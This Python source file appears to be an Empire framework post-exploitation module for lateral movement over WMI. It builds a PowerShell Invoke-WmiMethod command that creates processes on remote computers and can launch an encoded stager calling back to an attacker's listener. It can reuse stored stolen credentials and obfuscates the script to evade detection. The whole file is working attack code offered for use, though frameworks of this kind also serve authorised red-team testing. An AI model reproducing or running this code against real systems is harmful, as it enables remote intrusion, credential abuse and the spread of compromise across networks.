from __future__ import print_function

from builtins import str
from builtins import object

from empire.server.utils import data_util
from empire.server.common import helpers
from typing import Dict

from empire.server.common.module_models import PydanticModule


class Module(object):
    @staticmethod
    def generate(main_menu, module: PydanticModule, params: Dict, obfuscate: bool = False, obfuscation_command: str = ""):

        # Set booleans to false by default
        obfuscate = False

        listener_name = params['Listener']
        command = params['Command']
        user_agent = params['UserAgent']
        proxy = params['Proxy']
        proxy_creds = params['ProxyCreds']
        username = params['UserName']
        password = params['Password']
        if (params['Obfuscate']).lower() == 'true':
            obfuscate = True
        obfuscate_command = params['ObfuscateCommand']

        script = """$null = Invoke-WmiMethod -Path Win32_process -Name create"""


        # Only "Command" or "Listener" but not both
        if (listener_name == "" and command  == ""):
          print(helpers.color("[!] Listener or Command required"))
          return ""
        if (listener_name and command):
          print(helpers.color("[!] Cannot use Listener and Command at the same time"))
          return ""

        # if a credential ID is specified, try to parse
        cred_id = params["CredID"]
        if cred_id != "":

            if not main_menu.credentials.is_credential_valid(cred_id):
                print(helpers.color("[!] CredID is invalid!"))
                return ""

            (cred_id, cred_type, domain_name, username, password, host, os, sid, notes) = main_menu.credentials.get_credentials(cred_id)[0]

            if domain_name != "":
                params["UserName"] = str(domain_name) + "\\" + str(username)
            else:
                params["UserName"] = str(username)
            if password != "":
                params["Password"] = password


        if not main_menu.listeners.is_listener_valid(listener_name) and not command:
            # not a valid listener, return nothing for the script
            print(helpers.color("[!] Invalid listener: " + listener_name))
            return ""

        elif listener_name:

            # generate the PowerShell one-liner with all of the proper options set
            launcher = main_menu.stagers.generate_launcher(listener_name, language='powershell', encode=True,
                                                           userAgent=user_agent, obfuscate=obfuscate,
                                                           obfuscationCommand=obfuscate_command, proxy=proxy,
                                                           proxyCreds=proxy_creds, bypasses=params['Bypasses'])

            if launcher == "":
                return ""
            else:
                stagerCode = 'C:\\Windows\\System32\\WindowsPowershell\\v1.0\\' + launcher

        else:
                Cmd = command.replace('"','`"').replace('$','`$')
                stagerCode = Cmd
                print(helpers.color("[*] Running command:  " + command))

        # build the WMI execution string
        computer_names = "\"" + "\",\"".join(params['ComputerName'].split(",")) + "\""

        script += " -ComputerName @("+computer_names+")"
        script += " -ArgumentList \"" + stagerCode + "\""

        # if we're supplying alternate user credentials
        if username != '':
            script = "$PSPassword = \""+password+"\" | ConvertTo-SecureString -asPlainText -Force;$Credential = New-Object System.Management.Automation.PSCredential(\""+username+"\",$PSPassword);" + script + " -Credential $Credential"

            script += ";'Invoke-Wmi executed on " +computer_names +"'"

        if obfuscate:
            script = helpers.obfuscate(main_menu.installPath, psScript=script, obfuscationCommand=obfuscation_command)
        script = data_util.keyword_obfuscation(script)

        return script
